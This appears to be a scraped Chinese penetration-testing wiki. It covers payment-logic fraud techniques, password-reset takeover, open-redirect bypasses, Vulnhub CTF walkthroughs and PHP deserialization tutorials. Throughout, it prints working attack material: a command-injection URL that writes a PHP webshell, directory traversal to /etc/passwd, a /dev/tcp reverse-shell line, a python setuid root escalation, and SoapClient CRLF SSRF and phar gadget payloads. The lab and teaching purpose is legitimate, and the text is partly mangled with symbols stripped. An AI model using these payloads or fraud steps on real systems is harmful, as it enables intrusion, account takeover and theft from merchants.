这就导致了返回的金额会吧后面的9屏蔽掉，只返回0.01（也有些直接四舍五入变成0.02的） 当你支付完0.01后，第三方会通知服务器支付成功，而服务器那边生成的是0.019，可能这个软件的侨胞最小单位也是分，四舍五入变成了0.02 int整数溢出# 注意：在做溢出测试时，有可能导致目标服务器宕机，需要向授权单位申请授权后才能进行测试。 int的范围是-2147483648~2147483647。你可以把它看作是一个循环，当超过最大值后就重新从0开始计算 比如2147483649-2147483647。有时候支付里面没有负数所以从0开始计算了 当支付金额为2147483649时，支付金额就变成了1，即2147483649-21474836481 支付的时候可以直接吧金额改成这个值，在测试商品时也可以让总价格为这个数。2147483648物品单价+1物品数量 以上的做法目的，简单的来说就是通过整数溢出来修改支付金额或者购买商品数量。 突破时间限制#一些网站中的限时活动设置了活动时间范围，可以通过抓包尝试更改时间参数为活动未限定范围内的。 前端验证#前端加密、后端解密校验。比如在用户登录时，通过抓包发现用户密码被加密传输了，可以利用一些解密工具进行破解，如：Burp解密或者一些在线解密网站。 暴力破解撞库#首先在没有验证码或者验证码可以被绕过的情况下，尝试5次或者10次账号密码登陆，检测目标是否封禁账户，如果没有封禁规则，可以不断进行爆破。采用账号密码爆破，对于一些商城、应用、政府、学校采用撞库方式判断是否存在该账号（需要准备各类字典：手机号撞库、邮箱撞库、姓名撞库）。 密码找回# 通过邮箱找回密码，访问链接重置密码，输入新密码后提交抓包，虽然有token，但是依然可以直接修改用户ID进而修改他人密码 通过他人手机号找回密码，抓包，将他人手机号替换为自己的手机号，获取验证码，提交后修改密码 通过自己手机号找回密码，获取验证码后抓包，将数据包中的用户ID改为他人账号ID，提交后成功修改他人密码 通过邮箱找回密码，URL链接中修改用户ID为他人，邮箱不变，之后通过链接可以将他人账户绑定为自己的邮箱，之后通过邮箱找回密码 任意url跳转#url跳转漏洞也叫开发重定向漏洞，可以把用户重定向到攻击者自己构造的页面去，简单的说就是可以跳转到任意指定的url。一般出现在验证跳转、sso登陆等位置。 服务端未对传入的跳转url变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。 危害： 网站钓鱼 配合CSRF操作危险请求 配合XSS执行JS盗取cookie 配合浏览器漏洞（CVE-2018-8174） http://www.xxx.com?url=https://www.baidu.com 替换url参数后能够跳转到对应页面，但是一些网站可能会对url跳转做限制，可以尝试绕过bypass 1.利用问号绕过限制,最终跳转到京东页面url=https://www.baidu.com?www.jd.com2.利用@绕过限制,最终跳转到京东页面url=https://www.baidu.com@www.jd.com3.利用斜杆反斜杠绕过限制4.利用#绕过限制url=https://www.baidu.com@www.jd.com5.利用子域名绕过6.利用畸形url绕过7.利用跳转IP绕过 支付逻辑漏洞#在支付环节中由于逻辑不严谨而产生的漏洞称为支付漏洞。 测试思路#只要有参数，都可以修改，都有可能出现问题。 通常使用两个账号来对比测试，这样可以更快发现可疑参数 订单模块# 下单之后修改商品价格 下单之后更改数量设为负数，产生正负逻辑 并发购买是否出现逻辑问题 商品为0，是否存在购买的可能 生成订单时修改订单金额 结算模块# 优惠券重复利用 修改结算状态 更改支付API或者支付模式 伪造成功结算请求 退货模块# 更改货物状态 更改退货价格 收货模块# 绕过客户直接确认收货 边界值问题#正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户 顺序执行缺陷#正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。 金额直接传输导致篡改#直接对下单的金额进行修改值，这里可以使用fd或者burp抓包 确定支付之后还可以加入购物车#把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。 请求重放#购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。 请求参数干扰#金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。 订单替换#订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。 欺诈#需要两个收款人，一个是正常的商家，一个是伪造的商家 单位替换#产生在paypal类似的国际支付的场景。 用户替换#在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西 强制攻击#强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。 秘钥泄漏#内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。13.函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。 修复建议# 生成数据签名，对用户金额和订单签名 敏感参数不要放在url中 服务端校验过滤客户端提交的参数 在服务端计算金额的时候，一定要判断是否为正数 支付过程中加一个服务器生成的key，用户校验参数有没有被篡改 用url传递相关参数，后端进行数字验证 订单金额和充值接口返回的数据进行校验 提交订单时后台判断单价是否与数据库中相符，若不符则返回数据 支付时应从服务器拉取数据，而不是直接读取客户端的值 更新: 2025-09-06 13:59:58原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/a61bc4834500c95e187a5dcd3e45f497"},{"path":"/wiki/WP/Windows提权/vulnhub/GeminiIncv1.html","content":"GeminiInc v1前提 kali 192.168.129.152 靶机 NAT模式 信息收集ip检测 nmap -sP 192.168.129.024 ip 为 192.168.129.166 端口检测nmap -sT -sV -Pn 192.168.129.166 -p- -A 只开放了22,80 渗透测试提权 更新: 2025-11-21 21:43:24原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/kr14wpru9rzcti1a"},{"path":"/wiki/WP/Windows提权/vulnhub/Kioptrix_2014(#5).html","content":"Kioptrix: 2014 (#5)前提kali ip 192.168.129.152信息收集ip收集nmap -sP 192.168.129.024 端口收集nmap -sT -sV -Pn -v 192.168.129.164 -p- -A 扫描到 22，80，8080， 但是22端口关闭了 看看udp 端口 nmap -sU -p- 192.168.129.164 无 渗透测试80端口 检查源代码 访问 ehole扫描指纹 Apache,FreeBSD,mod_ssl,mod_dav, | Apache2.2.21 (FreeBSD) mod_ssl2.2.21 OpenSSL0.9.8q DAV2 PHP5.3.8 扫秒是否有漏洞 查看内容目录穿越http://192.168.129.164/pChart2.1.3/examples/index.php?Action=ViewScript=%2f..%2f..%2fetc/passwd 有三个用户，但都不能登录，尝试内核漏洞 etcshadow 没有权限 可以查看apache的配置http://192.168.129.164/pChart2.1.3/examples/index.php?Action=ViewScript=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf 只允许Mozilla4_browser 替换一下 使用这个插件，自定义 User-Agent :Mozilla4.0 但是感觉不太好用，默认的话，浏览器不能用 还是用BP吧 搜一下是什么，大概是cms 有msf模块，直接用 失败 翻看别人笔记，原来是没有设置payload 最重要的一点，没有设置ua show advanced 可以查看详细内容 手工尝试 exploitdb 显示 可以有两个方法 尝试输入一句话木马 http://192.168.129.164:8080/phptax/drawimage.php?pfilez=xxx;echo%20%27%3C?php%20echo%20system($_GET[%22cmd%22])%20?%3E%27%20%3E%202.php;pdfmake 看看成功没有 可以执行命令了，不知道为什么，连接蚁剑连不上 蚁剑连不上原因:得用适用合适的一句话木马这样才能连上 xsshttp://192.168.129.164/pChart2.1.3/examples/sandbox/script/session.php?%3Cscript%3Ealert(%27XSS%27)%3C/script%3E 但对提权作用不大 8080端口 禁止访问 权限提升搜索漏洞 searchsploit FreeBSD 9.0 28718.c没有成功，尝试263这个 系统里只有nc 和gcc kali 发送文件 nc -lvp 555526368.c客户机接受文件 nc 192.168.129.152 5555 111.c编译，执行 获取信息 总结 第一次用searchsploit 不太熟练，还得多用，英文还得好好看 中国蚁剑连接问题 ：得用相应木马，不然连不上蚁剑 更新: 2025-11-20 17:01:35原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/dgctw8y0ze7pbpbb"},{"path":"/wiki/WP/Windows提权/vulnhub/Toppo.html","content":"Toppo前提 kali ip 192.168.129.152 靶机 NAT 模式 信息收集检测ipnmap -sP 192.168.129.024 ip 是192.168.129.165 检测端口nmap -sT -sV -Pn 192.168.129.165 -p- -A 扫的太慢了的话，换这个nmap -sS -sV -Pn 192.168.129.165 -p- -A -sS 就是 TCP SYN 半连接扫描 22,80,111端口开放 渗透测试先看比较重要的80端口 80端口服务器是Apache 2.4.10 博客是start Bootstrap 搭建的 搜索Apache历史漏洞 这有点多了，ehole检测一下指纹信息，缩小选项 缩小不了，先看只有Apache的， 貌似失败了 searchsploit Bootstrap 只有xss，貌似不能getshell 目录扫描一波python dirsearch.py -u http://192.168.129.165/ 有个admin目录，查看一下 查看notes.txt 有一个密码，然后尝试访问一下，看有没有登陆处mail里什么都没有 http://192.168.129.165/vendor/ 这个好像是个目录,目录穿越失败 http://192.168.129.165/manual/en/index.html ok,网页端没有登陆界面111端口searchsploit rpcbind 好像都是dos攻击 没想到还有一个ssh登录，尝试一下密码是12345ted123，账号可能是ted尝试登陆 登陆成功 提权 这个就不用反弹shell了，当然，愿意的话也可以sh -i devtcp192.168.129.1525555 01 尝试sudo提权 查看etcpasswd只有一个用户 suid尝试查看是否有特权文件find -perm -us -type f 2devnull 尝试python2.7提权usrbinpython2.7 -c ‘import os; os.setuid(0); os.system(“binbash”)’ 更新: 2025-11-21 20:14:15原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/elmh88zhugphq4pt"},{"path":"/wiki/WP/反序列化/php/Deserialization+__call+SoapClient+CRLF=SSRF.html","content":"Deserialization + __call + SoapClient + CRLF SSRFphp中的内置类?php$classes = get_declared_classes();foreach ($classes as $class) $methods = get_class_methods($class); foreach ($methods as $method) if (in_array($method, array( __destruct, __toString, __wakeup, __call, __callStatic, __get, __set, __isset, __unset, __invoke, __set_state ))) print $class . :: . $method . ; 首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法 ?php$a = new SoapClient(null,array(uri=bbb, location=http://127.0.0.1:5555/path));$b = serialize($a);echo $b;$c = unserialize($b);$c-not_exists_function(); CRLF漏洞从上图可以看到，SOAPAction处可控，可以把\\x0d\\x0a注入到SOAPAction，POST请求的header就可以被控制 ?php$a = new SoapClient(null,array(uri=bbb\\r \\r ccc\\r , location=http://127.0.0.1:5555/path));$b = serialize($a);echo $b;$c = unserialize($b);$c-not_exists_function(); 但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据 在header里User-Agent在Content-Type前面 https://www.php.net/manual/zh/soapclient.soapclient.php : The user_agent option specifies string to use in User-Agent header. user_agent同样可以注入CRLF，控制Content-Type的值 wupco ?php$target = http://127.0.0.1:5555/path;$post_string = data=something;$headers = array( X-Forwarded-For: 127.0.0.1, Cookie: PHPSESSID=my_session );$b = new SoapClient(null,array(location = $target,user_agent=wupco^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string,uri = aaab));$aaa = serialize($b);$aaa = str_replace(^^,\\r ,$aaa);$aaa = str_replace(,,$aaa);echo $aaa;$c = unserialize($aaa);$c-not_exists_function();? 更新: 2025-09-06 15:37:18原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/1114302a1ccda5dfe94a4e12f96ee905"},{"path":"/wiki/WP/反序列化/php/session反序列化.html","content":"session反序列化 更新: 2025-09-06 15:37:25原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/78157cec2e797685db5247bd8ba41e31"},{"path":"/wiki/WP/反序列化/php/php反序列化.html","content":"php反序列化PHP反序列化这一篇就够了简介序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。 在网上找到一个比较形象的例子 比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。 php 将数据序列化和反序列化会用到两个函数 serialize 将对象格式化成有序的字符串 unserialize 将字符串还原成原来的对象 序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。 常见的序列化格式了解即可 二进制格式 字节数组 json字符串 xml字符串 案例引入简单的例子(以数组为例子) ?php$user=array(xiao,shi,zi);$user=serialize($user);echo($user.PHP_EOL);print_r(unserialize($user)); 他会输出 a:3:i:0;s:4:xiao;i:1;s:3:shi;i:2;s:2:zi;Array( [0] = xiao [1] = shi [2] = zi) 我们对上面这个例子做个简单讲解，方便大家入门 a:3:i:0;s:4:xiao;i:1;s:3:shi;i:2;s:2:zi;a:array代表是数组，后面的3说明有三个属性i:代表是整型数据int，后面的0是数组下标s:代表是字符串，后面的4是因为xiao长度为4 依次类推 序列化后的内容只有成员变量，没有成员函数，比如下面的例子 ?phpclass test public $a; public $b; function __construct()$this-a = xiaoshizi;$this-b=laoshizi; function happy()return $this-a;$a = new test();echo serialize($a);? 输出(O代表Object是对象的意思，也是类) O:4:test:2:s:1:a;s:9:xiaoshizi;s:1:b;s:8:laoshizi; 而如果变量前是protected，则会在变量名前加上\\x00*\\x00,private则会在变量名前加上\\x00类名\\x00,输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式，如下： ?phpclass test protected $a; private $b; function __construct()$this-a = xiaoshizi;$this-b=laoshizi; function happy()return $this-a;$a = new test();echo serialize($a);echo urlencode(serialize($a));? 输出则会导致不可见字符\\x00的丢失 O:4:test:2:s:4: * a;s:9:xiaoshizi;s:7: test b;s:8:laoshizi; 反序列化中常见的魔术方法__wakeup() //执行unserialize()时，先会调用这个函数__sleep() //执行serialize()时，先会调用这个函数__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试将对象调用为函数时触发 反序列化绕过小Trickphp7.1+反序列化对类属性不敏感我们前面说了如果变量前是protected，序列化结果会在变量名前加上\\x00*\\x00 但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有\\x00*\\x00也依然会输出abc ?phpclass test protected $a; public function __construct() $this-a = abc; public function __destruct() echo $this-a; unserialize(O:4:test:1:s:1:a;s:3:abc;); 绕过__wakeup(CVE-2016-7124) 版本： PHP5 5.6.25 PHP7 7.0.10 利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 对于下面这样一个自定义类 ?phpclass test public $a; public function __construct() $this-a = abc; public function __wakeup() $this-a=666; public function __destruct() echo $this-a; 如果执行unserialize(O:4:test:1:{s:1:a;s:3:abc;});输出结果为666 而把对象属性个数的值增大执行unserialize(O:4:test:2:{s:1:a;s:3:abc;});输出结果为abc 绕过部分正则preg_match(/^O:\\d+/)匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点 利用加号绕过（注意在url里传参时+要编码为%2B） serialize(array($ a)); $a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构) ?phpclass test public $a; public function __construct() $this-a = abc; public function __destruct() echo $this-a.PHP_EOL; function match($data) if (preg_match(/^O:\\d+/,$data)) die(you lose!); else return $data; $a = O:4:test:1:s:1:a;s:3:abc;;// +号绕过$b = str_replace(O:4,O:+4, $a);unserialize(match($b));// serialize(array($a));unserialize(a:1:i:0;O:4:test:1:s:1:a;s:3:abc;); 利用引用?phpclass test public $a; public $b; public function __construct() $this-a = abc; $this-b= $this-a; public function __destruct() if($this-a===$this-b) echo 666; $a = serialize(new test()); 上面这个例子将$b设置为$a的引用，可以使$a永远与$b相等 16进制绕过字符的过滤O:4:test:2:s:4:%00*%00a;s:3:abc;s:7:%00test%00b;s:3:def;可以写成O:4:test:2:S:4:\\00*\\00\\61;s:3:abc;s:7:%00test%00b;s:3:def;表示字符类型的s大写时，会被当成16进制解析。 我这里写了一个例子 ?phpclass test public $username; public function __construct() $this-username = admin; public function __destruct() echo 666; function check($data) if(stristr($data, username)!==False) echo(你绕不过！！.PHP_EOL); else return $data; // 未作处理前$a = O:4:test:1:s:8:username;s:5:admin;;$a = check($a);unserialize($a);// 做处理后 \\75是u的16进制$a = O:4:test:1:S:8:\\\\75sername;s:5:admin;;$a = check($a);unserialize($a); PHP反序列化字符逃逸情况1：过滤后字符变多首先给出本地的php代码，很简单不做过多的解释，就是把反序列化后的一个x替换成为两个 ?phpfunction change($str) return str_replace(x,xx,$str);$name = $_GET[name];$age = I am 11;$arr = array($name,$age);echo 反序列化字符串：;var_dump(serialize($arr));echo br/;echo 过滤后:;$old = change(serialize($arr));$new = unserialize($old);var_dump($new);echo br/此时，age=$new[1]; 正常情况,传入name=mao 如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸 首先来看看结果，再来讲解 我们传入name=maoxxxxxxxxxxxxxxxxxxxx;i:1;s:6:woaini;};i:1;s:6:woaini;}这一部分一共二十个字符由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符;i:1;s:6:woaini;}，从而造成;i:1;s:6:woaini;}的溢出，而闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出woaini最后的;}闭合反序列化全过程导致原来的;i:1;s:7:I am 11;}被舍弃，不影响反序列化过程 情况2：过滤后字符变少老规矩先上代码,很简单不做过多的解释，就是把反序列化后的两个x替换成为一个 ?phpfunction change($str) return str_replace(xx,x,$str);$arr[name] = $_GET[name];$arr[age] = $_GET[age];echo 反序列化字符串：;var_dump(serialize($arr));echo br/;echo 过滤后:;$old = change(serialize($arr));var_dump($old);echo br/;$new = unserialize($old);var_dump($new);echo br/此时，age=;echo $new[age]; 正常情况传入name=maoage=11的结果 老规矩看看最后构造的结果，再继续讲解 简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；我们来看，这部分是age序列化后的结果 s:3:age;s:28:11;s:3:age;s:6:woaini;} 由于前面是40个x所以导致少了20个字符，所以需要后面来补上，;s:3:age;s:28:11这一部分刚好20个，后面由于有闭合了前面因此后面的参数就可以由我们自定义执行了 对象注入当用户的请求在传给反序列化函数unserialize()之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的unserialize函数，最终导致一个在该应用范围内的任意PHP对象注入。 对象漏洞出现得满足两个前提 1、unserialize的参数可控。2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。 比如这个例子 ?phpclass A var $test = y4mao; function __destruct() echo $this-test; $a = O:1:A:1:s:4:test;s:5:maomi;;unserialize($a); 在脚本运行结束后便会调用_destruct函数，同时会覆盖test变量输出maomi POP链的构造利用POP链简单介绍前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来 简单案例讲解首先看看简单的MRCTF2020-Ezpop,不带大家一一读代码了，自己解决 ?phpclass Modifier protected $var; public function append($value) include($value); public function __invoke() $this-append($this-var); class Show public $source; public $str; public function __construct($file=index.php) $this-source = $file; echo Welcome to .$this-source.br; public function __toString() return $this-str-source; public function __wakeup() if(preg_match(/gopher|http|file|ftp|https|dict|\\.\\./i, $this-source)) echo hacker; $this-source = index.php; class Test public $p; public function __construct() $this-p = array(); public function __get($key) $function = $this-p; return $function(); 这里我直接说利用思路，首先逆向分析，我们最终是希望通过Modifier当中的append方法实现本地文件包含读取文件，回溯到调用它的__invoke，当我们将对象调用为函数时触发,发现在Test类当中的__get方法，再回溯到Show当中的__toString，再回溯到Show当中的__construct当中有echo $this-source可以调用__toString 因此不难构造pop链 ?phpini_set(memory_limit,-1);class Modifier protected $var = php://filter/read=convert.base64-encode/resource=flag.php;class Show public $source; public $str; public function __construct($file) $this-source = $file; $this-str = new Test(); class Test public $p; public function __construct() $this-p = new Modifier(); $a = new Show(aaa);$a = new Show($a);echo urlencode(serialize($a)); PHP原生类反序列化利用SoapClient介绍 综述： php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。 必须调用SoapClient不存在的方法，触发SoapClient的__call魔术方法。 通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容 SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用__call方法，具体详细的信息大家可以去搜索引擎看看，这里不再赘述 利用方式下面首先在我的VPS上面开启监听nc -lvvp 9328 ?php$a = new SoapClient(null,array(uri=bbb, location=http://xxxx.xxx.xx:9328));$b = serialize($a);$c = unserialize($b);$c - not_a_function();//调用不存在的方法，让SoapClient调用__call 运行上面的php程序，在我的vps上面奖会捕获监听 从上面这张图可以看到，SOAPAction处是我们的可控参数，因此我们可以尝试注入我们自己恶意构造的CRLF即插入**\\r **，利用成功！ 但是还有个问题我们再发送POST数据的时候是需要遵循HTTP协议，指定请求头Content-Type: applicationx-www-form-urlencoded但Content-Type在SOAPAction的上面，就无法控制Content-Type,也就不能控制POST的数据 接下来我们实验一下 实战反序列化我们传入的vip执行getFlag函数(迷惑人的函数) ?phphighlight_file(__FILE__);$vip = unserialize($_GET[vip]);$vip-getFlag();//flag.php$xff = explode(,, $_SERVER[HTTP_X_FORWARDED_FOR]);array_pop($xff);$ip = array_pop($xff);​​if($ip!==127.0.0.1) die(error);else $token = $_POST[token]; if($token==ctfshow) file_put_contents(flag.txt,$flag); 由于服务器带有cloudfare代理，我们无法通过本地构造XFF头实现绕过，我们需要使用SoapClient与CRLF实现SSRF访问127.0.0.1/flag.php,即可绕过cloudfare代理 ?php$target = http://127.0.0.1/flag.php;$post_string = token=ctfshow;$headers = array( X-Forwarded-For: 127.0.0.1,127.0.0.1, UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d);$b = new SoapClient(null,array(location = $target,user_agent=y4tacker^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string,uri = aaab));$aaa = serialize($b);$aaa = str_replace(^^,\\r ,$aaa);$aaa = str_replace(,,$aaa);echo urlencode($aaa); 接下来访问flag.txt即可 Phar反序列化phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。 什么是phar文件在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发 php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar:就是一种内置的流包装器。 php中一些常见的流包装器如下： file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 phar文件的结构stub:phar文件的标志，必须以 xxx __HALT_COMPILER();? 结尾，否则无法识别。xxx可以为自定义内容。manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。content:被压缩文件的内容signature (可空):签名，放在末尾。 如何生成一个phar文件？下面给出一个参考例子 ?php class Test @unlink(phar.phar); $phar = new Phar(phar.phar); //后缀名必须为phar $phar-startBuffering(); $phar-setStub(?php __HALT_COMPILER(); ?); //设置stub $o = new Test(); $phar-setMetadata($o); //将自定义的meta-data存入manifest $phar-addFromString(test.txt, test); //添加要压缩的文件 //签名自动计算 $phar-stopBuffering();? 漏洞利用条件 phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 受影响的函数知道创宇测试后受影响的函数列表： 实际上不止这些，也可以参考这篇链接，里面有详细说明https://blog.zsxsoft.com/post/38 当然为了阅读方便，这里便把它整理过来 //exifexif_thumbnailexif_imagetype //gdimageloadfontimagecreatefrom***系列函数 //hash hash_hmac_filehash_filehash_update_filemd5_filesha1_file // file/urlget_meta_tagsget_headers //standard getimagesizegetimagesizefromstring // zip $zip = new ZipArchive();$res = $zip-open(c.zip);$zip-extractTo(phar://test.phar/test);// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过$z = compress.bzip2://phar:///home/sx/test.phar/test.txt;$z = compress.zlib://phar:///home/sx/test.phar/test.txt;//配合其他协议：(SUCTF)//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d///当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。//php://filter/read=convert.base64-encode/resource=phar://phar.phar//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。?php $pdo = new PDO(sprintf(pgsql:host=%s;dbname=%s;user=%s;password=%s, 127.0.0.1, postgres, sx, 123456)); @$pdo-pgsqlCopyFromFile(aa, phar://phar.phar/aa);? // Mysql//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper//配置一下mysqld://[mysqld]//local-infile=1//secure_file_priv= ?phpclass A public $s = ; public function __wakeup () system($this-s); $m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, localhost, root, root, testtable, 3306);$p = mysqli_query($m, LOAD DATA LOCAL INFILE \\phar://test.phar/test\\ INTO TABLE a LINES TERMINATED BY \\\\r \\ IGNORE 1 LINES;);? 绕过方式当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://等绕过 compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txt 当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。php:filterreadconvert.base64-encoderesourcephar:phar.phar GIF格式验证可以通过在文件头部添加GIF89a绕过1、$phar-setStub(“GIF89a”.””); 设置stub2、生成一个phar.phar，修改后缀名为phar.gif php-session反序列化session简单介绍在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。 当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。 session 的存储机制php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的 php_serialize 经过serialize()函数序列化数组 php 键名+竖线+经过serialize()函数处理的值 php_binary 键名的长度对应的ascii字符+键名+serialize()函数序列化的值 php.ini中一些session配置 session.save_path”” –设置session的存储路径session.save_handler””–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动session.serialize_handler string–定义用来序列化反序列化的处理器名字。默认使用php 利用姿势session.upload_progress进行文件包含和反序列化渗透这篇文章说的很详细了，没必要班门弄斧 https://www.freebuf.com/vuls/202819.html 使用不同的引擎来处理session文件$_SESSION变量直接可控php引擎的存储格式是键名|serialized_string，而php_serialize引擎的存储格式是serialized_string。如果程序使用两个引擎来分别处理的话就会出现问题 来看看这两个php // 1.php?phpini_set(session.serialize_handler, php_serialize);session_start();$_SESSION[y4] = $_GET[a];var_dump($_SESSION);//2.php?phpini_set(session.serialize_handler, php);session_start();class test public $name; function __wakeup() echo $this-name; 首先访问1.php，传入参数a=|O:4:test:1:{s:4:name;s:8:y4tacker;}再访问2.php，注意不要忘记| 